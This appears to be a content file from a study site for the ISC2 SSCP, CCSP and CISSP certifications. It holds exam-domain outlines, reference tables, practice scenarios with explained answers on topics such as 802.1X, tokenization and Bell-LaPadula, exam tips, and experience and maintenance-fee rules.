items.why: Access follows the job role (supervisor or clerk), so it's role-based.

pbqs.title: Secure the network
pbqs.scenario: Your unit's network has gaps. For each requirement, pick the BEST control and where it goes. Each control is used once.

rows.req: Stop unknown laptops from getting a network connection by plugging into any office wall jack.
rows.why: 802.1X makes each device authenticate (through RADIUS) before the switch port opens.

rows.req: Log every command each admin runs on routers and switches.
rows.why: TACACS+ authorizes and logs each command separately for device administration.

rows.req: Make Wi-Fi users sign in with their own credentials instead of one shared password.
rows.why: WPA3-Enterprise uses 802.1X/EAP, so each user authenticates individually.

rows.req: Block known exploit traffic coming in from the internet before it reaches servers.
rows.why: An inline IPS at the edge can drop malicious traffic, not just alert on it.

rows.req: Keep building cameras and badge readers from reaching user workstations.
rows.why: Putting IoT devices on their own segment (VLAN) isolates them from everything else.

rows.req: Stop spreadsheets with Social Security numbers from leaving in outbound email.
rows.why: DLP at the email gateway can spot sensitive data patterns and block the message.

extras.title: Access control models
rows: The system enforces labels (like Secret) and clearances. Users can't change them.
The owner of a file decides who gets access. Common on file shares.
Access comes from your job role. Change jobs, change roles.
System-wide rules apply to everyone, like firewall rules or allowed login hours.
Decisions use attributes of the user, the resource and the situation: who, what, where, when.

extras.title: Control types
rows: Discourages an attack. Warning banners, visible cameras.
Stops it from happening. Firewall rules, MFA, locked doors.
Finds it while or after it happens. IDS alerts, log reviews, audits.
Fixes things after an incident. Restoring from backup, patching.
A substitute when the normal control isn't possible, like extra monitoring on a system that can't be patched.

extras.title: Incident response, in order
rows: Preparation: plans, contacts, tools and training before anything happens.
Detection and analysis: confirm it's real, judge its scope and escalate.
Containment: stop the spread, like isolating a host or disabling an account.
Eradication: remove the cause, such as malware or the attacker's accounts.
Recovery: restore systems, verify they're clean and watch them closely.
Post-incident: lessons learned, then update plans and controls.

extras.title: Crypto at a glance
rows: One-way fingerprint. Proves data didn't change (integrity).
Added to a password before hashing so identical passwords get different hashes.
One shared key. Fast, so it encrypts the bulk data.
A public and private key pair. Used for key exchange and signatures.
Hash signed with the sender's private key. Integrity, authenticity and non-repudiation.
A certificate authority vouches that a public key belongs to someone.

extras.title: Network access
rows: A device must authenticate before the switch port or Wi-Fi lets it on.
UDP. Combines authentication and authorization; only the password is encrypted.
TCP 49. Encrypts the whole session and splits AAA apart, so each command can be authorized and logged.
An encrypted tunnel back to the network, often with MFA.
The desktop runs in the data center; only the screen reaches the user.

keep.text: Earn 60 continuing professional education (CPE) credits every three years. ISC2 suggests about 20 a year.
Every ISC2 member who holds SSCP pays a $135 annual maintenance fee (AMF), due each year on your certification anniversary.
keep.after: One AMF covers all your ISC2 certs, so adding CISSP later doesn't add a second fee.

keep.text: You need one year of full-time paid work in at least one of the seven domains. A computer science or IT degree can count for that year. Part-time work and internships can count too.
list: No experience yet? Pass the exam and you become an Associate of ISC2.
You then have two years to earn the one year of experience.
After you pass, finish the certification application, including endorsement by an ISC2-certified member, within nine months.

items: The full outline (effective Oct 1, 2025), domain by domain.
Exam facts, experience requirements and purchase options.
Read the four canons. Ethics questions follow them.
ISC2's own course (90-day access), sold with the exam as a bundle.
How organizations plan for and handle incidents. Matches Domain 4.
The framework DoD systems use. Matches Domain 3.
Govern, Identify, Protect, Detect, Respond, Recover.
SIEM, log analysis, network traffic and incident rooms. Lines up with Domains 3, 4 and 7.
Networking, web and Linux basics, if Domain 6 feels shaky.

tips: No going back
SSCP uses computerized adaptive testing (CAT). You answer one question at a time and can't return to earlier ones.
It can end early
The exam stops once it's confident you've passed or failed, anywhere from 100 to 125 questions. Ending early isn't a bad sign.
Think like the practitioner
Pick the answer a careful admin would do next under policy, not the drastic fix. Escalate when it's above your authority.
Order matters
For incidents, contain before you eradicate, and preserve evidence before you wipe anything.
Ethics come first
For ethics questions, protecting society and acting honestly beat doing what a boss or client asks.

v26.label: 2026 outline
v26.note: ISC2 updated the CCSP outline on August 1, 2026. The six domains are the same, but there's new material on AI and machine learning (1.6 and 2.9) and the weights shifted a little. Older books follow the previous outline, so fill those gaps from the outline itself. The exam is adaptive (CAT): 100 to 150 questions in 3 hours.

domains.name: Cloud Concepts, Architecture and Design
obj: Understand cloud computing concepts
Cloud definitions and roles (customer, provider, broker), the essential characteristics like on-demand self-service and elasticity, and the building blocks: compute, storage, networking.
Describe cloud reference architecture
How the pieces fit together: service models, deployment models, cloud activities and shared considerations like interoperability and portability.
Understand security concepts for cloud computing
Cryptography and key management, identity and access control, data sanitization, network and virtualization security, and common cloud threats.
Understand design principles of secure cloud computing
Secure data lifecycle, BC/DR and business impact analysis, cost-benefit, security design patterns and DevOps security.
Evaluate cloud service providers
Check a provider against criteria like ISO/IEC 27017 and PCI DSS, and products against certifications like Common Criteria and FIPS 140 for crypto modules.
Comprehend AI and machine learning
AI for threat detection, data validation and SOAR automation, plus the ethics and regulation that come with it.

domains.name: Cloud Data Security
obj: Describe cloud data concepts
The data lifecycle (create, store, use, share, archive, destroy), data dispersion across locations, and data flows.
Design and implement cloud data storage architectures
Storage types (like object, volume and ephemeral storage) and the threats to each, such as a storage bucket left open to the public.
Design and apply data security technologies
Encryption and key management, hashing, masking, tokenization, DLP, and managing secrets and certificates.
Implement data discovery
Find structured, unstructured and semi-structured data, and know where it physically lives.
Plan and implement data classification
Classification policies, data mapping, and labeling or tagging data so controls follow it.
Design and implement information rights management (IRM)
Controls that travel with the file: who can open, edit, print or forward it, plus certificate issuance and revocation.
Plan data retention, deletion and archiving
Retention periods, secure deletion (crypto-shredding in the cloud), archiving, and legal holds that pause deletion.
Design auditability, traceability and accountability
Which events to log, log analysis, chain of custody and non-repudiation for data events.
Comprehend protection of AI and ML data
Keeping training data and models private and secure, and validating them against poisoning.

domains.name: Cloud Platform and Infrastructure Security
obj: Comprehend cloud infrastructure components
Physical environment, network, compute, virtualization, storage and the management plane that controls it all.
Design a secure data center
Logical design (tenant separation), physical and environmental design, and resilience.
Analyze risks of cloud infrastructure and platforms
Risk assessment, cloud-specific vulnerabilities and attacks (like VM escape), and risk treatment.
Plan and implement security controls
Physical and environmental protection, system and communication protection, identification and access, and audit mechanisms.
Plan business continuity and disaster recovery
BC/DR strategy, recovery time and point objectives (RTO, RPO), and creating, testing and updating the plan.

domains.name: Cloud Application Security
obj: Advocate application security training and awareness
Cloud development basics, common pitfalls, and vulnerability lists like the OWASP Top 10.
Describe the secure software development life cycle (SDLC)
Business requirements, SDLC phases and methodologies like Agile, and where security fits in each.
Apply the secure SDLC
Threat modeling, secure coding and configuration management throughout development.
Apply cloud software assurance and validation
Functional and security testing (SAST, DAST), testing in CI/CD pipelines, QA, and abuse case testing.
Use verified secure software
API security, supply chain management, and vetting third-party and open-source components.
Comprehend cloud application architecture
Web application firewalls, API gateways, cryptography, sandboxing, and containers and orchestration.
Design identity and access management solutions
Federation, identity providers, SSO, MFA, cloud access security brokers (CASB) and secrets management.

domains.name: Cloud Security Operations
obj: Build physical and logical infrastructure
Secure hardware and virtual configuration, secure defaults, management tools and guest OS tool sets.
Operate and maintain cloud infrastructure
Access controls, network security, OS hardening, patching, clustering and high availability, monitoring, and backup and restore.
Implement operational controls and standards
Frameworks like NIST, ISO/IEC 27001 and 20000-1, ITIL, CIS Controls and COBIT for running operations.
Support digital forensics
Forensic collection in the cloud, where you may not control the hardware, and evidence management.
Manage communication with relevant parties
Vendors, customers, partners, regulators and other stakeholders, before and during incidents.
Manage security operations
SOC and monitoring, log analysis and SIEM, incident response, vulnerability assessment and pen testing, and change, continuity and capacity management.

domains.name: Legal, Risk and Compliance
obj: Articulate legal requirements and risks in the cloud
Conflicting laws across countries, legal frameworks, eDiscovery and forensic requirements.
Understand privacy requirements
Contractual vs regulated data, privacy laws like GDPR and HIPAA, jurisdiction, and privacy impact assessments (PIAs).
Understand audit processes for the cloud
Internal and external audits, audit reports (SOC 1, 2, 3), scope limits, gap analysis, ISMS, and specialized compliance like PCI DSS.
Understand cloud impact on enterprise risk management
Risk treatment, risk frameworks and metrics, and assessing the provider's risk environment.
Understand outsourcing and cloud contract design
SLAs, master service agreements (MSAs), statements of work (SOWs), vendor management, the right to audit, and exit terms.

pbqs.title: Pick the protection technique
pbqs.scenario: A unit is moving six data sets to the cloud. Pick the BEST technique for each one's requirement.

items.log:
Billing must charge real card numbers,
but the app database must not hold them.
items.why: Tokens replace the card numbers in the app; the real ones stay in a separate vault.

items.log:
Agents see only the last 4 digits of a
member's SSN on screen.
items.why: Masking hides most of the value for display while keeping it usable.

items.log:
Share survey results publicly with no way
to trace answers to a person.
items.why: Anonymization removes identifiers for good, so data can't be tied back to anyone.

items.log:
Backups in object storage must be
unreadable if the bucket leaks.
items.why: Encrypting at rest makes the files useless without the keys.

items.log:
Prove downloaded installers weren't
changed after they were published.
items.why: Comparing a hash to the published value proves integrity.

items.log:
Leaving the provider; make sure the data
on their disks can never be read again.
items.why: Destroying the encryption keys renders the leftover data unreadable.

pbqs.title: Who secures what
pbqs.scenario: For each task, pick the service model it describes and who is responsible for it under the shared responsibility model.

rows.req: Patch the operating system on the virtual machines you rent.
rows.why: In IaaS the guest OS is yours to patch.

rows.req: Patch the language runtime that runs the code you upload to a managed app platform.
rows.why: In PaaS the provider runs and patches the OS and runtime.

rows.req: Decide which users can read records in a hosted email and office suite.
rows.why: Even in SaaS, who gets access to your data is always the customer's call.

rows.req: Physical security of the data center behind a hosted HR app.
rows.why: In SaaS the provider owns the whole stack, including the building.

rows.req: Set firewall rules (security groups) for the VMs you rent.
rows.why: In IaaS you configure network access to your own instances.

rows.req: Fix an injection flaw in code you deployed to a managed app platform.
rows.why: In PaaS your own application code is your responsibility.

extras.title: Who secures what
rows: Provider: hardware, network, hypervisor. You: guest OS, patching, apps, data, firewall rules.
Provider: also the OS and runtime. You: your code, its settings, users and data.
Provider: almost everything. You: who has access, how it's configured, and your data.
Your data and your users' access. You can't hand those off, in any model.

extras.title: Cloud data lifecycle
rows: Create: classify and label data the moment it's made.
Store: encrypt at rest and control access.
Use: protect it in use with access control, masking and monitoring.
Share: encrypt in transit, use IRM and DLP to control where it goes.
Archive: keep it for the required retention period, still encrypted.
Destroy: crypto-shred (delete the keys) since you can't wipe the provider's disks.

extras.title: Data protection techniques
rows: Reversible with the key. Protects data at rest and in transit.
Swaps the real value for a random token; the real one sits in a separate vault. Common for card numbers.
Hides part of a value, like ***-**-1234. Good for screens and test data.
Removes identifiers for good. The data can't be tied back to a person.
One-way fingerprint. Proves data didn't change.
Watches data in motion and at rest and blocks sensitive data from leaving.

extras.title: Recovery terms
rows: Finds which systems matter most and what an outage costs.
The longest the mission can survive without the system.
How fast the system must be back. Must be shorter than the MTD.
How much data you can afford to lose, measured in time since the last backup.

extras.title: Audits and authorizations
rows: Security, availability, integrity, confidentiality and privacy. Type I is one point in time; Type II covers a period.
A short version of SOC 2 that can be shared publicly.
Certifies the provider's information security management system (ISMS).
Authorization for cloud services used by federal agencies. DoD adds its own impact levels (IL2 to IL6).

extras.title: Contract terms
rows: Measurable promises like uptime, and what happens when they're missed.
The overall legal terms for the relationship.
The specific work for a project under the MSA.
Your right to check the provider, often met with their SOC 2 report.
How you get your data back, in what format, and how theirs is destroyed.

keep.text: Earn 90 continuing professional education (CPE) credits every three years. ISC2 suggests about 30 a year.
CCSP holders pay a $135 annual maintenance fee (AMF), due each year on your certification anniversary.
keep.after: One AMF covers all your ISC2 certs, so holding SSCP or CISSP too doesn't add a second fee.

keep.text: You need five years of full-time paid IT work. Three must be in cybersecurity and one in a CCSP domain. Part-time work and internships can count too.
list: A computer science or IT degree, or CSA's CCSK certificate, can waive one year. Only one year can be waived.
An active CISSP covers the whole experience requirement.
No experience yet? Pass the exam and you become an Associate of ISC2, with six years to earn the five.
After you pass, finish the certification application, including endorsement, within nine months.

items: Exam facts, experience rules and purchase options.
Read the four canons. Ethics questions follow them.
ISC2's own course, sold with the exam as a bundle.
The CSA's cloud security guide. Many CCSP topics come from it.
The official definition of the service and deployment models.
How the U.S. government authorizes cloud services.
Free cloud fundamentals and security courses to see the concepts in a real platform.
Free modules and sandboxes for identity, networking and data protection on Azure.

tips: No going back
CCSP uses computerized adaptive testing (CAT). You answer one question at a time and can't return to earlier ones.
It can end early
The exam stops once it's confident you've passed or failed, anywhere from 100 to 150 questions.
Pick the vendor-neutral answer
Questions don't name AWS or Azure services. Answer with the general concept.
Contracts and data come first
When answers look close, protecting the data and following the contract and the law usually beat a technical fix.
Ethics come first
For ethics questions, protecting society and acting honestly beat doing what a boss or client asks.

v24.label: 2024 outline
v24.note: ISC2 says a new CISSP outline takes effect April 15, 2027. Testing before then? Use this one. Testing on or after it? Check ISC2's new outline first; early reports describe small weight shifts and more on passwordless sign-in, post-quantum crypto and AI. Since September 2026, ISC2's exam guidance also weaves AI security into all eight domains.

domains.name: Security and Risk Management
obj: Understand, adhere to and promote professional ethics
The ISC2 Code of Ethics and your organization's code, and which wins when they conflict.
Understand and apply security concepts
Confidentiality, integrity and availability, plus authenticity and non-repudiation.
Evaluate and apply security governance principles
Align security with the mission, organizational roles, control frameworks, and due care and due diligence.
Understand legal, regulatory and compliance issues
Cybercrime and breaches, licensing and intellectual property, export controls, cross-border data flow and privacy laws.
Understand requirements for investigation types
Administrative, criminal, civil, regulatory and industry-standard investigations, and the proof each needs.
Develop and implement security policy, standards, procedures and guidelines
Which document says what: mandatory policies and standards versus step-by-step procedures and optional guidelines.
Identify and implement business continuity requirements
Business impact analysis (BIA) and outside dependencies.
Contribute to and enforce personnel security
Screening and hiring, agreements, onboarding, transfers and termination, and vendor and contractor rules.
Understand and apply risk management concepts
Threats and vulnerabilities, risk analysis and response, control types, assessments, monitoring and risk frameworks.
Understand and apply threat modeling
Methods like STRIDE and PASTA to find threats early in a design.
Apply supply chain risk management (SCRM)
Tampering and counterfeit risks, third-party assessments, minimum security requirements and software bills of materials (SBOMs).
Establish a security awareness and training program
Awareness methods like phishing drills, keeping content current with new tech, and measuring whether it works.

domains.name: Asset Security
obj: Identify and classify information and assets
Classify data and assets by sensitivity and value.
Establish information and asset handling requirements
How each classification must be marked, stored, sent and handled.
Provision information and assets securely
Ownership, inventories and asset management.
Manage the data lifecycle
Data roles (owner, custodian, controller, processor), collection, location, retention, remanence and destruction.
Ensure appropriate asset retention
Keep assets the right amount of time, including at end of life and end of support.
Determine data security controls and compliance requirements
Data states (at rest, in transit, in use), scoping and tailoring baselines, and DRM, DLP and CASB.

domains.name: Security Architecture and Engineering
obj: Use secure design principles in engineering
Threat modeling, least privilege, defense in depth, secure defaults, zero trust, privacy by design, shared responsibility and SASE.
Understand security models
Bell-LaPadula (confidentiality), Biba (integrity), Clark-Wilson and others, and what each one prevents.
Select controls based on system security requirements
Pick controls that match a system's requirements and risk.
Understand security capabilities of information systems
Memory protection, the Trusted Platform Module (TPM) and built-in encryption.
Assess and mitigate vulnerabilities in architectures
Client, server, database, ICS, cloud, IoT, microservices, containers, serverless, embedded and edge systems.
Select and determine cryptographic solutions
The crypto lifecycle, symmetric, asymmetric, elliptic curve and quantum methods, and PKI.
Understand cryptanalytic attacks
Brute force, known plaintext, frequency analysis, side-channel, timing, man-in-the-middle, pass-the-hash and Kerberos attacks.
Apply security principles to site and facility design
Design buildings and spaces with security built in from the start.
Design site and facility security controls
Wiring closets, data centers, media and evidence storage, HVAC, fire protection and power.
Manage the information system lifecycle
From stakeholder needs through design, testing, deployment, operations and disposal.

domains.name: Communication and Network Security
obj: Apply secure design principles in network architectures
OSI and TCP/IP, IPv4 and IPv6, secure protocols, segmentation, wireless and cellular, CDNs, SDN and virtual private clouds.
Secure network components
Redundant infrastructure, transmission media, network access control (NAC) and endpoint security.
Implement secure communication channels
Voice, video and collaboration, remote access, data communications and third-party connections.

domains.name: Identity and Access Management (IAM)
obj: Control physical and logical access to assets
Access to information, systems, devices, facilities, applications and services.
Design identification and authentication strategy
For people, devices and services: MFA, session management, identity proofing, SSO, credential vaults and just-in-time access.
Federated identity with a third-party service
Federation on-premises, in the cloud and in hybrid setups.
Implement and manage authorization mechanisms
RBAC, rule-based, MAC, DAC, ABAC and risk-based access, plus policy decision and enforcement points.
Manage the identity and access provisioning lifecycle
Access reviews, provisioning and deprovisioning, role changes, privilege escalation and service accounts.
Implement authentication systems
Run the systems that authenticate users, like Kerberos, SAML and OpenID Connect.

domains.name: Security Assessment and Testing
obj: Design and validate assessment, test and audit strategies
Internal, external, third-party and location-based strategies.
Conduct security control testing
Vulnerability assessments, pen testing (red, blue and purple teams), log reviews, code review and breach simulations.
Collect security process data
Account management, key performance and risk indicators (KPIs, KRIs), backup checks, training, and DR and BC data.
Analyze test output and generate reports
Remediation, exception handling and ethical disclosure.
Conduct or facilitate security audits
Internal, external and third-party audits.

domains.name: Security Operations
obj: Understand and comply with investigations
Evidence collection and handling, reporting, forensic tools and artifacts.
Conduct logging and monitoring
IDS/IPS, SIEM, continuous and egress monitoring, threat intelligence and user behavior analytics (UEBA).
Perform configuration management
Provisioning, baselines and automation.
Apply foundational security operations concepts
Need to know, least privilege, separation of duties, privileged accounts, job rotation and SLAs.
Apply resource protection
Media management and protecting data at rest and in transit.
Conduct incident management
From detection and response through recovery, remediation and lessons learned.
Operate detection and preventive measures
Firewalls, IDS/IPS, allow and deny lists, sandboxing, honeypots, anti-malware and AI-based tools.
Implement patch and vulnerability management
Find, prioritize, patch and verify.
Participate in change management
Request, review, approve, test, implement and document changes.
Implement recovery strategies
Backup storage, recovery sites, multiple processing sites, high availability and fault tolerance.
Implement disaster recovery processes
Response, personnel, communications, assessment, restoration and lessons learned.
Test disaster recovery plans
Read-through, walkthrough, simulation, parallel and full interruption tests.
Participate in business continuity planning and exercises
Keep the mission running during and after a disruption.
Implement and manage physical security
Perimeter and internal security controls.
Address personnel safety and security
Travel, training, emergency management and duress situations.

domains.name: Software Development Security
obj: Integrate security in the software development lifecycle
Methodologies like Agile and DevSecOps, maturity models, operations and change management.
Apply security controls in development ecosystems
Languages, libraries, tool sets, CI/CD, code repositories and application security testing.
Assess the effectiveness of software security
Auditing and logging of changes, and risk analysis.
Assess the security impact of acquired software
Commercial off-the-shelf (COTS), open source, third-party, managed and cloud services.
Define and apply secure coding guidelines
Source-level flaws, API security and secure coding practices.

pbqs.title: Run the numbers
pbqs.scenario: For each risk, pick the single loss expectancy (SLE = asset value × exposure factor) and the annualized loss expectancy (ALE = SLE × annual rate of occurrence).

rows.req: Server room flood. Asset value $500,000, exposure factor 20%, expected once every 10 years.
Ransomware on a file server. Asset value $80,000, exposure factor 50%, expected once every 2 years.
Laptop theft. Each laptop and its data is worth $25,000 and is fully lost (100%). Expected twice a year.
Website defacement. Asset value $100,000, exposure factor 10%, expected once every 4 years.

pbqs.title: Name the model or principle
pbqs.scenario: Each control below enforces a security model or principle. Pick the one it matches.

items.log:
A Top Secret user can't save notes
into an Unclassified share.
items.why: No write down protects confidentiality: Bell-LaPadula.

items.log:
Results from an unverified outside lab
can't be written into the trusted record.
items.why: Lower-integrity data can't be written up into higher-integrity data: Biba.

items.log:
Clerks never edit the database directly; a
program checks each change and logs it.
items.why: Changes only through well-formed, audited transactions: Clark-Wilson.

items.log:
An analyst who advised one bidder is blocked
from a competing bidder's files.
items.why: Blocking access across a conflict of interest is the Chinese Wall: Brewer-Nash.

items.log:
One sailor submits a purchase request;
a different sailor must approve it.
items.why: Splitting a sensitive task between two people is separation of duties.

items.log:
Techs get password-reset rights only,
not full domain admin.
items.why: Giving only the access the job needs is least privilege.

extras.title: Risk math
rows: What the asset is worth in dollars.
The percent of the asset lost in one event.
AV × EF. The cost of one event.
How many times a year you expect it. Once every 10 years is 0.1.
SLE × ARO. The yearly cost of the risk.
ALE before − ALE after − the control's yearly cost. Positive means yes.

extras.title: Security models
rows: Confidentiality. No read up, no write down.
Integrity. No read down, no write up.
Integrity through well-formed transactions: users change data only through checked programs.
Conflict of interest (the Chinese Wall). Seeing one client's data blocks you from a competitor's.

extras.title: Data roles
rows: Senior person accountable for the data. Sets its classification.
IT staff who protect it day to day: backups, access, patching.
Decides why and how personal data is processed.
Processes personal data on the controller's behalf, like a cloud vendor.
The person the personal data is about.

extras.title: Investigation types
rows: Internal matters, like policy violations. Lowest bar.
Broke the law. Proof beyond a reasonable doubt.
Disputes between parties. Preponderance of the evidence (more likely than not).
A government agency checks compliance with its rules.
Checks against standards like PCI DSS. Not law, but often in contracts.

extras.title: DR plan tests
rows: Team members review the plan on their own.
The team talks through a scenario together.
Act out a realistic scenario without moving operations.
Bring up the alternate site while production keeps running.
Shut down production and run from the alternate site. Most realistic, most risk.

extras.title: Incident management, in order
rows: Detection: spot the event and confirm it's an incident.
Response: activate the team and start the process.
Mitigation: contain it so it can't spread.
Reporting: tell the people and agencies that must be told.
Recovery: restore systems to normal operation.
Remediation: fix the root cause so it doesn't happen again.
Lessons learned: review what happened and improve.

keep.text: Earn 120 continuing professional education (CPE) credits every three years. ISC2 suggests about 40 a year.
CISSP holders pay a $135 annual maintenance fee (AMF), due each year on your certification anniversary.
keep.after: One AMF covers all your ISC2 certs, so adding CCSP or SSCP doesn't add a second fee.

keep.text: You need five years of full-time paid work in two or more of the eight domains. Part-time work and internships can count too.
list: A computer science or IT degree, or a credential on ISC2's approved list, can waive one year. Only one year can be waived.
ISC2 trimmed that list on April 1, 2026. Reports say Security+, CySA+ and SecurityX still qualify; check ISC2's list before you apply.
No experience yet? Pass the exam and you become an Associate of ISC2, with six years to earn the five.
After you pass, finish the certification application, including endorsement, within nine months.

CISSP uses computerized adaptive testing (CAT). You answer one question at a time and can't return to earlier ones.
It can end early
